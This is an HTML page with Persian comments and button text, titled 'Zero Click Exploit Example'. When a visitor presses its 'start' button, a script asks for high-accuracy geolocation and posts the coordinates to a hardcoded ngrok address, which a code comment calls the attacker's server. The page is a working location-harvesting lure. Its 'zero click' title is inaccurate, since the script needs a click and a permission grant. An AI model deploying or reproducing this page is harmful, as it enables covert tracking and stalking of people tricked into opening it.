<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zero Click Exploit Example</title>
    <style>
        /* CSS برای طراحی صفحه */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            text-align: center;
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        h1 {
            font-size: 24px;
            color: #333;
        }

        p {
            font-size: 16px;
            color: #555;
            margin-bottom: 20px;
        }

        button {
            background-color: #4CAF50; /* رنگ سبز */
            color: white;
            padding: 15px 32px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #45a049; /* تغییر رنگ به سبز تیره */
        }

        button:active {
            background-color: #388e3c; /* رنگ فعال */
        }

        .alert {
            font-size: 14px;
            color: red;
            margin-top: 20px;
        }

        .success {
            font-size: 14px;
            color: green;
            margin-top: 20px;
        }
    </style>
    <script>
        // این کد زمانی اجرا می‌شود که کاربر روی دکمه "شروع" کلیک کند
        function start() {
            if (navigator.geolocation) {
                // درخواست موقعیت جغرافیایی از کاربر
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        console.log("Latitude: " + latitude + ", Longitude: " + longitude);
                        // ارسال موقعیت به سرور ngrok بدون نیاز به کلیک دوباره
                        sendDataToServer(latitude, longitude);
                    }, 
                    function(error) {
                        console.error("Error getting location: " + error.message);
                        alert("Couldn't get your location. Please allow location access.");
                    },
                    {
                        enableHighAccuracy: true, // درخواست دقت بالا
                        timeout: 10000,           // محدودیت زمان درخواست
                        maximumAge: 0            // به‌روزرسانی موقعیت در هر بار
                    }
                );
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        // ارسال اطلاعات به سرور مهاجم که از ngrok استفاده می‌کند
        function sendDataToServer(latitude, longitude) {
            const serverUrl = "https://d545-195-26-248-218.ngrok-free.app"; // URL سرور ngrok

            // ساخت درخواست HTTP POST با استفاده از Fetch API
            fetch(serverUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    latitude: latitude,
                    longitude: longitude
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log("Location data sent successfully:", data);
                showMessage("Location sent successfully.", "success");
            })
            .catch(error => {
                console.error("Error sending data to server:", error);
                showMessage("Error sending location data to server.", "alert");
            });
        }

        // نمایش پیام به کاربر
        function showMessage(message, type) {
            const messageElement = document.createElement("p");
            messageElement.className = type;
            messageElement.textContent = message;
            document.body.appendChild(messageElement);
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Zero Click Exploit Example</h1>
        <p>برای شروع، دکمه زیر را فشار دهید تا موقعیت شما ارسال شود:</p>
        
        <!-- دکمه شروع -->
        <button onclick="start()">شروع</button>
    </div>
</body>
</html>
